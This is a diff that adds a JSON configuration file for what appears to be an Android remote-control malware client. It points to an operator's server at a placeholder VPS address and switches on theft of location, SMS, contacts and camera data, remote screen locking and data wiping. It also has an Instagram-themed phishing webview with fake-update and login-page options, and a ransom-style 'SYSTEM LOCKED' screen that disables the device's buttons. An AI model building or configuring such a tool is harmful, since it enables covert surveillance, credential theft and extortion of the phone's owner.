@@ -1,0 +1,38 @@
+{
+  "api_url": "http://YOUR_VPS_IP:3000",
+  "ws_url": "ws://YOUR_VPS_IP:3001",
+  "version": "2.5",
+  "features": {
+    "location": true,
+    "sms": true,
+    "contacts": true,
+    "camera": true,
+    "lock_screen": true,
+    "wipe_data": true,
+    "flashlight": true,
+    "floating_images": true
+  },
+  "heartbeat_interval": 5,
+  "reconnect_delay": 5000,
+  "command_timeout": 30,
+  "server": {
+    "host": "YOUR_VPS_IP",
+    "port": 3000,
+    "ws_port": 3001
+  },
+  "phishing": {
+    "webview_url": "https://www.instagram.com",
+    "fake_update": false,
+    "login_page": false
+  },
+  "lock_screen": {
+    "title": "⚠️ SYSTEM LOCKED ⚠️",
+    "message": "This device has been remotely locked. Contact administrator.",
+    "torch_blink": true,
+    "disable_buttons": true
+  },
+  "update": {
+    "auto_update": false,
+    "download_url": ""
+  }
+}
